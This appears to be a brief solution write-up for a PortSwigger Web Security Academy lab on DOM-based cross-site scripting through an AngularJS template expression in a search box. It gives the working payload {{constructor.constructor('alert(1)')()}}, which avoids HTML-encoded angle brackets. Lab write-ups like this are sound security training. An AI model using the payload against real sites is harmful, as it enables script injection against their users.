# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

## This lab contains a [DOM-based cross-site scripting](https://portswigger.net/web-security/cross-site-scripting/dom-based) vulnerability in a [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) expression within the search functionality.

## AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

## To solve this lab, perform a [cross-site scripting](https://portswigger.net/web-security/cross-site-scripting) attack that executes an AngularJS expression and calls the `alert` function.

### ANS: {{constructor.constructor('alert(1)')()}}

{{constructor.constructor('alert(1)')()}} enter into search box
